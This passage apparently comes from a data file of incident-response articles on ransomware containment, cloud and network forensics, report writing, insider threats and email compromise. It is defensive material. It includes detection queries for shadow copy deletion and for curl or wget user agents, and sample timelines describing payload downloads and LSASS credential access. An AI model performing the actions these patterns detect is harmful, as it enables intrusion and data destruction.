file.extension:(lockbit OR conti OR ryuk OR encrypted OR locked)

# Find shadow copy deletion:
process.command_line:(*shadowcopy* OR *vssadmin*) AND event.action:"ProcessCreated"
```

## Containment (30-60 minutes)

```bash
# IMMEDIATE ISOLATION — disconnect from network first:
# Do NOT shut down (preserves memory artifacts)
# Do NOT reboot (may trigger additional encryption or delete logs)

# Isolation methods:
# 1. Physical network disconnection (preferred — pull cable, disable WiFi)
# 2. Firewall block at network level (ACL/VLAN isolation)
# 3. Endpoint isolation via EDR (CrowdStrike, Defender for Endpoint)

# PowerShell emergency isolation:
# Block all traffic except from IR workstation:
netsh advfirewall firewall add rule name="IR BLOCK ALL" dir=out action=block
netsh advfirewall firewall add rule name="IR ALLOW IR" dir=out action=allow remoteip=192.168.1.100
netsh advfirewall firewall add rule name="IR BLOCK IN" dir=in action=block
netsh advfirewall firewall add rule name="IR ALLOW IR IN" dir=in action=allow remoteip=192.168.1.100

# Identify patient zero and propagation:
# Check for lateral movement tools (PsExec, WMI, cobalt strike artifacts)
# Query logs for network shares accessed near encryption time
```

## Evidence Collection

```bash
# Order: memory first, then disk
# 1. Memory acquisition:
winpmem_mini_x64_rc2.exe \\evidence-server\share\IR-2025-001\hostname_memory.raw

# 2. KAPE triage:
kape.exe --tsource C: --tdest \\evidence-server\share\IR-2025-001\hostname_triage \
    --target KapeTriage

# 3. Disk image (if system can be taken offline):
# Attach write-blocker, image with FTK Imager

# 4. Ransom note (photograph and hash):
Get-ChildItem C:\Users\ -Recurse -Filter "*.txt" |
  Where-Object {$_.Name -match "decrypt|ransom|README|HOW_TO"} |
  Get-Content
```

## Ransomware Family Identification

```bash
# 1. Ransom note analysis:
# Format, payment address, contact method identify family

# 2. Encrypted file extension:
# .lockbit, .conti, .ryuk, .alphv, .darkside, .hive

# 3. ID Ransomware (online tool):
# https://id-ransomware.malwarehunterteam.com/
# Submit: ransom note text or encrypted file sample

# 4. Ransom note hash lookup on VirusTotal / Any.Run

# 5. Known decryptors:
# https://www.nomoreransom.org/ — community decryptors
# Check: Emsisoft, Kaspersky, Avast free decryption tools
```

## Recovery Assessment

```bash
# Identify encrypted scope:
Get-ChildItem C:\ -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object {$_.Extension -in @('.lockbit','.conti','.encrypted')} |
  Measure-Object

# Check backup integrity:
# - When was last successful backup?
# - Are VSS snapshots available? (most ransomware deletes these)
vssadmin list shadows

# Check backup systems:
# - Were backup servers also hit?
# - Are backups offline/air-gapped?
# - Do backups predate the infection?

# Estimate recovery time:
# Small environment (100 endpoints): 2-5 days
# Enterprise (1000+ endpoints): 1-3 weeks
```

## Root Cause Investigation

```bash
# Most common initial access vectors for ransomware:

# 1. Phishing email with malicious attachment:
# Check email gateway logs for attachment delivery to patient zero
# Timeline: email delivery → macro execution → C2 beacon → ransomware

# 2. RDP brute force:
# Windows Event Log EventID 4625 (failed logon) spikes before compromise
Get-EventLog Security -InstanceId 4625 | Group-Object -Property MachineName | Sort Count -Desc

# 3. VPN/Citrix exploit:
# Check VPN authentication logs around infection time
# Look for: unusual geolocation, multiple failed attempts then success

# 4. Supply chain / MSP compromise:
# Ransomware deployed via RMM tool (ConnectWise, TeamViewer, Kaseya)
# Check for scheduled tasks or services created by RMM agents
```

## Post-Incident

```bash
# Indicators to share:
# 1. Ransomware binary hashes (MD5/SHA256)
# 2. C2 infrastructure (IPs, domains)
# 3. Mutex names
# 4. Dropped file paths and names
# 5. Registry persistence keys
# 6. Network IOCs (User-Agent, URI patterns)

# Share via:
# - ISAC (Information Sharing and Analysis Center)
# - MISP threat intel platform
# - FBI IC3 / CISA reporting

# Lessons learned:
# - Was this detected by security controls? If not, why?
# - What is the estimated dwell time?
# - What controls would have prevented this?
```
""",
    },
    {
        "title": "Cloud Forensics — AWS CloudTrail, Azure Activity Logs, GCP Audit",
        "tags": ["cloud-forensics", "aws", "azure", "gcp", "dfir", "incident-response"],
        "content": """# Cloud Forensics

## AWS CloudTrail

CloudTrail logs all API calls made to AWS services. Essential for any AWS incident.

```bash
# Enable CloudTrail (if not already enabled):
aws cloudtrail create-trail --name org-trail --s3-bucket-name my-cloudtrail-logs \
    --include-global-service-events --is-multi-region-trail
aws cloudtrail start-logging --name org-trail

# Query recent events (CLI):
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
    --start-time "2025-03-15T00:00:00Z" --end-time "2025-03-16T00:00:00Z"

# Query failed authentication:
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
    --start-time "2025-03-15T00:00:00Z" | \
    python3 -c "import json,sys; events=json.load(sys.stdin)['Events']; \
    [print(e['EventTime'],e.get('CloudTrailEvent','{}')) for e in events]"

# Query for privilege escalation indicators:
for event in AttachUserPolicy CreateAccessKey CreateUser PutRolePolicy; do
    aws cloudtrail lookup-events \
        --lookup-attributes AttributeKey=EventName,AttributeValue=$event
done

# Query IAM changes:
aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventSource,AttributeValue=iam.amazonaws.com \
    --start-time "2025-03-15T00:00:00Z"
```

### CloudTrail Log Analysis with Athena

```sql
-- Create Athena table over CloudTrail S3 bucket:
CREATE EXTERNAL TABLE cloudtrail_logs (
    eventVersion STRING, userIdentity STRUCT<...>, eventTime STRING,
    eventSource STRING, eventName STRING, awsRegion STRING,
    sourceIPAddress STRING, requestParameters STRING, responseElements STRING
)
ROW FORMAT SERDE 'org.openx.data.jsonserde.JsonSerDe'
LOCATION 's3://my-cloudtrail-logs/AWSLogs/123456789012/CloudTrail/';

-- Find console logins from unusual IPs:
SELECT eventTime, userIdentity.userName, sourceIPAddress, responseElements
FROM cloudtrail_logs
WHERE eventName = 'ConsoleLogin'
  AND responseElements LIKE '%Success%'
  AND NOT regexp_like(sourceIPAddress, '^10\.|^192\.168\.|^172\.')
ORDER BY eventTime DESC;

-- Find IAM changes:
SELECT eventTime, userIdentity.arn, eventName, requestParameters
FROM cloudtrail_logs
WHERE eventSource = 'iam.amazonaws.com'
  AND eventName IN ('CreateUser','AttachUserPolicy','CreateAccessKey','PutRolePolicy')
ORDER BY eventTime;

-- Find data exfiltration (S3 GetObject in bulk):
SELECT DATE_TRUNC('hour', from_iso8601_timestamp(eventTime)) AS hour,
       userIdentity.arn, COUNT(*) AS get_count, SUM(requestParameters.contentLength) AS bytes
FROM cloudtrail_logs
WHERE eventName = 'GetObject'
GROUP BY 1, 2
HAVING COUNT(*) > 1000
ORDER BY bytes DESC;
```

## Azure Activity Logs

```bash
# Azure CLI — query activity logs:
az monitor activity-log list \
    --start-time "2025-03-15T00:00:00Z" \
    --end-time "2025-03-16T00:00:00Z" \
    --output json > azure_activity.json

# Filter by event category:
az monitor activity-log list \
    --start-time "2025-03-15T00:00:00Z" \
    --categories Security \
    --output json

# Azure AD sign-in logs (requires Azure AD P1/P2):
az ad audit-log list --filter "createdDateTime ge 2025-03-15T00:00:00Z"

# Microsoft Sentinel KQL queries:
# Unusual sign-in activity:
```

```kql
// Azure AD - Failed sign-ins from unusual locations
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType != "0"    // 0 = success
| summarize FailCount = count() by UserPrincipalName, Location, IPAddress
| where FailCount > 10
| order by FailCount desc

// Azure resource changes:
AzureActivity
| where TimeGenerated > ago(24h)
| where ActivityStatus == "Succeeded"
| where OperationName contains "write" or OperationName contains "delete"
| where Caller !startswith "automation" and Caller !startswith "azure-"
| project TimeGenerated, Caller, OperationName, ResourceGroup, Resource
| order by TimeGenerated desc
```

## GCP Cloud Audit Logs

```bash
# gcloud CLI — query audit logs:
gcloud logging read \
    'logName="projects/my-project/logs/cloudaudit.googleapis.com%2Factivity" AND
     timestamp >= "2025-03-15T00:00:00Z"' \
    --format json > gcp_audit.json

# Filter for IAM changes:
gcloud logging read \
    'logName:"cloudaudit.googleapis.com/activity" AND
     protoPayload.serviceName="iam.googleapis.com"' \
    --format json

# Filter for GCS data access:
gcloud logging read \
    'logName:"cloudaudit.googleapis.com/data_access" AND
     protoPayload.serviceName="storage.googleapis.com" AND
     protoPayload.methodName="storage.objects.get"' \
    --format json | python3 -c "
import json, sys
logs = json.load(sys.stdin)
for entry in logs:
    proto = entry.get('protoPayload', {})
    print(entry.get('timestamp'), proto.get('authenticationInfo',{}).get('principalEmail'), proto.get('resourceName'))
"
```

## Container/Kubernetes Forensics

```bash
# Pod execution history:
kubectl get events --all-namespaces --sort-by='.lastTimestamp' > k8s_events.txt

# Recent pod creates/deletes:
kubectl get events --all-namespaces -o json | \
    python3 -c "
import json, sys
events = json.load(sys.stdin)['items']
for e in events:
    if e['reason'] in ['Created','Killing','Pulled','Started']:
        print(e['lastTimestamp'], e['reason'], e.get('involvedObject',{}).get('name'))
"

# Check for privileged containers (escape risk):
kubectl get pods --all-namespaces -o json | \
    python3 -c "
import json, sys
pods = json.load(sys.stdin)['items']
for pod in pods:
    for container in pod['spec'].get('containers',[]):
        sc = container.get('securityContext',{})
        if sc.get('privileged') or sc.get('runAsRoot'):
            print('PRIVILEGED:', pod['metadata']['namespace'], pod['metadata']['name'], container['name'])
"
```
""",
    },
    {
        "title": "Forensic Report Writing — Structure, Evidence Presentation, Court-Ready",
        "tags": ["forensic-reporting", "dfir", "incident-response", "court-ready"],
        "content": """# Forensic Report Writing

## Report Types

| Report Type | Audience | Focus |
|---|---|---|
| Technical Examination Report | Legal team, opposing experts | Methodology, findings, evidence chain |
| Executive Summary | CISO, C-suite | Impact, risk, remediation status |
| Incident Report | SOC, IT, management | Timeline, affected systems, actions taken |
| Malware Analysis Report | Threat intel, engineering | IOCs, TTPs, detection signatures |

## Technical Report Structure

```
1. COVER PAGE
   - Case number, date, classification
   - Examiner name and credentials
   - Attorney/client (if legal proceeding)

2. EXECUTIVE SUMMARY (1-2 paragraphs)
   - What happened, when, scope of impact
   - Key findings in plain language

3. SCOPE AND METHODOLOGY
   - Systems examined
   - Tools used (name, version, hash)
   - Collection methods
   - Analysis environment

4. FINDINGS
   - Numbered findings with supporting evidence
   - Direct evidence vs. inference clearly labeled

5. TIMELINE
   - Chronological event sequence
   - Source of each timestamp noted

6. INDICATORS OF COMPROMISE
   - Hashes, IPs, domains, file paths, registry keys

7. CONCLUSIONS AND OPINIONS
   - What the evidence proves
   - Reasonable alternative explanations considered and addressed

8. APPENDICES
   - Raw data, screenshots, tool outputs
   - Chain of custody forms
   - Hash verification logs
```

## Writing Guidelines

### Objectivity and Precision

```
BAD:  "The attacker used PowerShell to download malware."
GOOD: "Process execution logs (Windows Event ID 4688) show powershell.exe
       executed with parameters '-EncodedCommand <base64 string>'
       (Appendix A, Event 12345). The decoded command downloads
       'payload.ps1' from hxxp://185[.]220[.]101[.]45/gate (Appendix B).
       This is consistent with an initial access download stage."
```

### Describing Evidence

```
AVOID:
  "The malware was obviously a Cobalt Strike beacon."

USE:
  "The file 'svchost32.exe' (SHA256: abc123...) matched 52 of 72
   antivirus signatures on VirusTotal (accessed 2025-03-16).
   Static analysis identified a Cobalt Strike beacon configuration
   using CobaltStrikeParser v1.4 (hash: def456...).
   The configuration revealed: C2 server 185.220.101.45:443,
   sleep interval 60 seconds, jitter 10%, HTTP GET profile."
```

## Timeline Documentation

```
TIMELINE FORMAT:

Date/Time (UTC)   | Source              | Event Description
------------------|---------------------|--------------------------------
2025-03-15 13:47  | Email gateway logs  | Phishing email received by jsmith@company.com
                  |                     | From: invoice@legitimate-looking.com
                  |                     | Attachment: Invoice_March.docx (hash: aabbcc)
2025-03-15 13:52  | EDR telemetry       | WINWORD.EXE (PID 3421) spawned
                  |                     | powershell.exe (PID 4567) with
                  |                     | -EncodedCommand [base64]
2025-03-15 13:53  | Proxy logs          | HTTP GET to hxxp://185.220.101.45/stage2.ps1
                  |                     | Source: WORKSTATION-01 (10.0.1.45)
                  |                     | Response: 200 OK, 45,234 bytes
2025-03-15 13:54  | Memory forensics    | svchost.exe (PID 1848): RWX VAD region
                  |                     | with MZ header (CS beacon per YARA)
2025-03-15 13:55  | Firewall logs       | TCP/443 ESTABLISHED: 10.0.1.45 → 185.220.101.45
                  | (persistent)        | Periodic ~60s intervals (beaconing pattern)
2025-03-15 14:02  | EDR telemetry       | mimikatz.exe executed (hash matches VirusTotal)
                  |                     | LSASS opened with PROCESS_VM_READ (EventID 4663)
```

## IOC Defanging for Reports

```
# Defang URLs and IPs to prevent accidental clicks/resolution:
http://evil.com      → hxxp://evil[.]com
https://evil.com     → hxxps://evil[.]com
185.220.101.45       → 185[.]220[.]101[.]45
evil@attacker.com    → evil@attacker[.]com

# Python defanging:
ioc = "http://evil.com/gate.php?id=1234"
defanged = ioc.replace("http", "hxxp").replace(".", "[.]")
print(defanged)
# hxxp://evil[.]com/gate[.]php?id=1234
```

## Quality Checklist

```
[ ] All timestamps include timezone (UTC preferred)
[ ] Every claim supported by specific evidence reference
[ ] Tool versions and hashes documented
[ ] Chain of custody forms complete
[ ] Hashes verified before and after acquisition
[ ] No unsupported opinions stated as facts
[ ] IOCs defanged in report
[ ] Classification markings on every page
[ ] Report reviewed by second analyst (peer review)
[ ] Methodology reproducible (another analyst could get same result)
```
""",
    },
    {
        "title": "Network Forensics in IR — PCAP Collection, NetFlow, Zeek Logs",
        "tags": ["network-forensics", "pcap", "netflow", "zeek", "dfir", "incident-response"],
        "content": """# Network Forensics in Incident Response

## Traffic Capture

```bash
# tcpdump — targeted capture:
tcpdump -i eth0 -w capture.pcap host 185.220.101.45  # Single host
tcpdump -i eth0 -w capture.pcap port 4444            # Single port
tcpdump -i eth0 -s 0 -w capture.pcap                 # Full packet capture

# Rotate captures (avoid single huge file):
tcpdump -i eth0 -G 3600 -w "capture_%Y%m%d_%H%M%S.pcap"  # New file every hour

# Wireshark capture filter:
# tcp port 4444 or tcp port 443 and host 185.220.101.45

# Network tap — passive capture without disturbing traffic:
# Hardware: Gigamon, Ixia, NETSCOUT
# Software: SPAN/mirror port on managed switch
```

## Zeek Network Security Monitor

```bash
# Run Zeek on captured PCAP:
zeek -r capture.pcap local.zeek

# Or on live interface:
zeek -i eth0 local.zeek

# Zeek generates structured logs (TSV format):
# conn.log      — all connections (src/dst/port/bytes/duration)
# http.log      — HTTP requests/responses
# ssl.log       — TLS connections (JA3/JA3S, server name, cert info)
# dns.log       — DNS queries and responses
# files.log     — files transferred (with MD5/SHA256)
# notice.log    — security notices
# weird.log     — unusual protocol behavior
```

### Zeek Log Analysis

```bash
# All outbound connections with high byte counts:
zeek-cut id.resp_h id.resp_p proto bytes_out service < conn.log | \
    awk '$4 > 10000000 {print}' | sort -k4 -rn | head -20

# HTTP with suspicious user agents:
zeek-cut ts id.orig_h id.resp_h uri user_agent < http.log | \
    grep -iE "curl|wget|python-requests|go-http|java/|libwww"

# DNS to unusual TLDs or high-entropy domains:
zeek-cut ts id.orig_h query qtype_name answers < dns.log | \
    awk '{if(length($3) > 50) print}'

# TLS to self-signed or suspicious certificates:
zeek-cut ts id.orig_h id.resp_h server_name subject ja3 ja3s < ssl.log | \
    grep -v "microsoft\|google\|amazon\|cloudflare"

# Files with known bad hashes:
zeek-cut md5 sha256 filename mime_type < files.log | \
    # Cross-reference with threat intel hash list
    grep -f known_bad_hashes.txt
```

## NetFlow/IPFIX Analysis

```bash
# NetFlow provides summary-level traffic data (no payload, just metadata)
# Collectors: ntopng, nfdump, SiLK, ElasticFlow

# nfdump queries:
# All flows to/from suspicious IP:
nfdump -R /var/flows/ -s record/bytes \
    "src ip 185.220.101.45 or dst ip 185.220.101.45"

# Large data transfers (> 100MB):
nfdump -R /var/flows/ "bytes > 100000000" -o "fmt:%ts %sa %da %sp %dp %byt %pkt"

# Beaconing detection (regular interval flows):
nfdump -R /var/flows/ -A srcip,dstip,dstport \
    "dst ip 185.220.101.45" -s record/flows

# Top talkers:
nfdump -R /var/flows/ -n 20 -s srcip/bytes

# DNS amplification/tunneling:
nfdump -R /var/flows/ -n 20 -s dstip/bytes "dst port 53"
```

## PCAP Analysis with TShark

```bash
# Extract all HTTP requests:
tshark -r capture.pcap -Y "http.request" -T fields \
    -e frame.time -e ip.src -e ip.dst -e http.request.method \
    -e http.host -e http.request.uri -e http.user_agent

# Extract DNS queries:
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields \
    -e frame.time -e ip.src -e dns.qry.name -e dns.qry.type

# Extract files from PCAP (HTTP objects):
tshark -r capture.pcap --export-objects http,exported_files/

# Extract TLS handshake details:
tshark -r capture.pcap -Y "tls.handshake.type == 1" -T fields \
    -e ip.src -e ip.dst -e tls.handshake.extensions_server_name

# Decrypt TLS with session key log:
# Browser export: SSLKEYLOGFILE=~/ssl_keys.log chromium
tshark -r capture.pcap -o tls.keylog_file:ssl_keys.log \
    -Y "http" -T fields -e http.request.full_uri -e http.file_data
```

## Evidence Preservation for Network Data

```bash
# Chain of custody for PCAPs:
sha256sum capture.pcap > capture.pcap.sha256
md5sum capture.pcap >> capture.pcap.sha256
echo "Captured by: $(whoami) on $(hostname) at $(date -u)" >> capture.pcap.sha256

# Compress and archive:
gzip -c capture.pcap > capture_$(date +%Y%m%d_%H%M%S).pcap.gz
sha256sum capture_*.pcap.gz > checksums.txt
```
""",
    },
    {
        "title": "Insider Threat Investigation — User Activity Reconstruction",
        "tags": ["insider-threat", "user-activity", "dfir", "incident-response"],
        "content": """# Insider Threat Investigation

## Investigation Principles

Insider threat investigations require strict adherence to HR policies and legal requirements. Always involve HR and legal counsel before beginning. Avoid alerting the subject prematurely.

## Evidence Sources for User Activity

```bash
# Windows User Activity Timeline:
# 1. Windows Event Logs (logon/logoff, process creation)
# 2. NTUSER.DAT (RecentDocs, TypedURLs, UserAssist)
# 3. ShellBags (folder navigation history)
# 4. LNK files (file access history)
# 5. Jump Lists (recently opened files per application)
# 6. Browser history (Chrome, Firefox, Edge)
# 7. Email (Exchange/O365 message trace, Outlook PST/OST)
# 8. USB device history (SetupAPI, USBSTOR registry)
# 9. DLP alerts (if deployed)
# 10. Clipboard history (Windows 10+)
```

## Logon/Logoff Analysis

```bash
# Extract logon events:
Get-EventLog Security -InstanceId 4624,4634,4647,4800,4801 |
    Select-Object TimeGenerated, EventID, Message |
    Export-Csv logon_events.csv

# EventID 4624: Successful logon
# EventID 4634: Account logoff
# EventID 4647: User-initiated logoff
# EventID 4800: Workstation locked
# EventID 4801: Workstation unlocked

# Remote logon events (lateral movement or remote access):
Get-EventLog Security -InstanceId 4624 |
    Where-Object {$_.Message -match "Logon Type:.*10|Logon Type:.*3"} |
    Select TimeGenerated, Message
# Type 3 = Network; Type 10 = Remote Interactive (RDP)

# KQL for Elastic:
event.code:4624 AND winlog.event_data.LogonType:("3" OR "10")
| stats count by winlog.event_data.TargetUserName, source.ip
```

## File Access Investigation

```bash
# Recent documents (NTUSER.DAT):
RECmd.exe -f NTUSER.DAT \
    --kn "Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" \
    --csv output\ --csvf recent_docs.csv

# Files accessed from specific directory (LNK files):
LECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\" --csv output\ |
    grep "C:\Sensitive_Project"

# USB-connected files:
LECmd.exe -d "%APPDATA%\Microsoft\Windows\Recent\" --csv output\ |
    grep "^E:\|^F:\|^G:\"  # Typical USB drive letters

# Shell history via ShellBags:
# ShellBagsExplorer.exe (GUI) or:
rip.pl -r NTUSER.DAT -p shellbags | grep "Sensitive"
```

## Email Investigation

```bash
# Office 365 Message Trace:
Get-MessageTrace -SenderAddress suspect@company.com \
    -StartDate 2025-03-01 -EndDate 2025-03-16 |
    Select ReceivedDateTime, SenderAddress, RecipientAddress, Subject, Status |
    Export-Csv email_trace.csv

# Check for external forwarding rules (common exfiltration method):
Get-InboxRule -Mailbox suspect@company.com |
    Where-Object {$_.ForwardTo -or $_.ForwardAsAttachmentTo -or $_.RedirectTo}

# Large email attachments sent externally:
Get-MessageTrace -SenderAddress suspect@company.com |
    Where-Object {$_.RecipientAddress -notlike "*@company.com"} |
    Select ReceivedDateTime, RecipientAddress, Subject

# PST/OST offline analysis:
# Tools: pst-extractor, libpff, Kernel PST Viewer
python3 pst_extract.py suspect.pst --output email_export/
```

## Data Staging and Exfiltration Detection

```bash
# Large file copies (DLP or EDR logs):
# Search for bulk file copy operations before resignation/incident

# Unusual external storage usage:
# USBSTOR registry changes near investigation timeframe
RECmd.exe -f SYSTEM --kn "ControlSet001\Enum\USBSTOR" --csv output\
# Cross-reference timestamps with subject's working hours

# Cloud sync upload spikes:
# DLP: flag large uploads to Dropbox, Google Drive, OneDrive, WeTransfer
# Proxy logs: bytes_out to cloud storage providers
grep -iE "dropbox.com|drive.google.com|onedrive.live.com|wetransfer.com" proxy_logs.txt | \
    awk '{print $1, $bytes_out_field}' | sort -k1

# Compressed archives in unusual locations:
# Suspect often stages data in ZIP/7z before exfiltration
Get-ChildItem C:\Users\suspect -Recurse -Include *.zip,*.7z,*.rar -ErrorAction SilentlyContinue |
    Select FullName, Length, CreationTime, LastWriteTime |
    Where-Object {$_.Length -gt 50MB}
```

## User Activity Timeline Reconstruction

```bash
# Build super timeline focused on suspect's activity:
log2timeline.py --storage-file user_timeline.plaso \
    --parsers "prefetch,mft,usnjrnl,winevtx,winreg,chrome_history,firefox_history,lnk,shellbags" \
    /mnt/suspect_disk/

# Filter to suspect's working hours and suspicious file paths:
psort.py -w user_activity.csv -o l2tcsv user_timeline.plaso \
    "user contains 'suspect_username' AND date >= '2025-03-10'"

# Focus on last week before departure/incident
```
""",
    },
    {
        "title": "Business Email Compromise — Investigation Methodology",
        "tags": ["bec", "email-forensics", "incident-response", "dfir"],
        "content": """# Business Email Compromise (BEC) Investigation

## BEC Overview

BEC involves compromised or spoofed business email accounts used for financial fraud, credential harvesting, or supply chain attacks.

## Common BEC Scenarios

| Scenario | Method | Target |
|---|---|---|
| CEO Fraud | Spoofed/compromised executive email | Finance team wire transfer |
| Vendor Email Compromise | Compromised vendor account | Payment redirection |
| W-2 Fraud | Executive impersonation | HR/payroll — employee tax forms |
| Attorney Impersonation | Law firm account compromise | Client fund transfer |
| Account Takeover | Credential phishing | O365/Gmail access |

## Initial Triage

```bash
# Office 365 — check if account was actually compromised:
# 1. Sign-in logs for suspicious activity:
Get-AzureADAuditSignInLogs -Filter "userPrincipalName eq 'victim@company.com'" |
    Select CreatedDateTime, IpAddress, Location, RiskLevel, Status |
    Where-Object {$_.Status.ErrorCode -eq 0} |  # Successful logins
    Export-Csv signins.csv

# 2. Check for suspicious inbox rules:
Get-InboxRule -Mailbox victim@company.com |
    Select Name, Enabled, ForwardTo, DeleteMessage, MoveToFolder, MarkAsRead |
    Format-Table -Wrap

# Common attacker rules:
# - Forward all email to external address
# - Delete emails from specific senders (hide responses)
# - Move replies to subfolder (victim doesn't see replies)

# 3. Check connected apps (OAuth grants):
Get-AzureADServicePrincipal -All $true |
    Where-Object {$_.ReplyUrls -like "*gmail.com*" -or $_.ReplyUrls -like "*protonmail*"}
```

## Email Header Analysis

```bash
# Extract and parse email headers:
# Full headers visible in Outlook: File > Properties

# Key header fields:
# Received: chain shows routing path (read bottom-up)
# Authentication-Results: SPF/DKIM/DMARC results
# X-Originating-IP: actual sender IP
# Message-ID: unique identifier for tracking

# SPF/DKIM/DMARC evaluation:
# Pass = legitimate send path; Fail = spoofed or misconfigured
# DMARC fail = either SPF or DKIM failed + alignment issue

# Python email header parser:
import email
from email import policy

with open("suspicious_email.eml", "rb") as f:
    msg = email.message_from_bytes(f.read(), policy=policy.default)

print("From:", msg["From"])
print("Reply-To:", msg["Reply-To"])
print("Return-Path:", msg["Return-Path"])
print("Authentication-Results:", msg["Authentication-Results"])
for header in msg.get_all("Received", []):
    print("Received:", header[:200])
```

## O365 Investigation via Microsoft Graph

```bash
# Microsoft Graph API — comprehensive O365 forensics:
# 1. Get access token
TOKEN=$(curl -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
    -d "client_id=<id>&client_secret=<secret>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials" \
    | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# 2. Get sign-in logs:
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/auditLogs/signIns?\\$filter=userPrincipalName eq 'victim@company.com'"

# 3. Get mailbox rules:
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/users/victim@company.com/mailFolders/inbox/messageRules"

# 4. Get email messages (search for specific content):
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/users/victim@company.com/messages?\\$search='wire transfer'"

# 5. List OAuth app grants:
curl -H "Authorization: Bearer $TOKEN" \
    "https://graph.microsoft.com/v1.0/users/victim@company.com/oauth2PermissionGrants"
```

## Evidence Preservation for BEC

```bash
# Microsoft Purview Compliance Center:
# 1. Place mailbox on Litigation Hold to prevent deletion
Set-Mailbox victim@company.com -LitigationHoldEnabled $true

# 2. Create eDiscovery search:
New-ComplianceSearch -Name "BEC Investigation" \
    -ExchangeLocation victim@company.com \
    -ContentMatchQuery "From:'attacker@external.com'"
Start-ComplianceSearch -Identity "BEC Investigation"

# 3. Export search results:
New-ComplianceSearchAction -SearchName "BEC Investigation" -Export

# 4. Enable audit log search (if not already):
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true

# 5. Search unified audit log:
Search-UnifiedAuditLog -StartDate "2025-03-01" -EndDate "2025-03-16" \
    -UserIds victim@company.com \
    -Operations "MailboxLogin,Set-InboxRule,New-InboxRule" |
    Select CreationDate, UserIds, Operations, AuditData
```
""",
    },
]
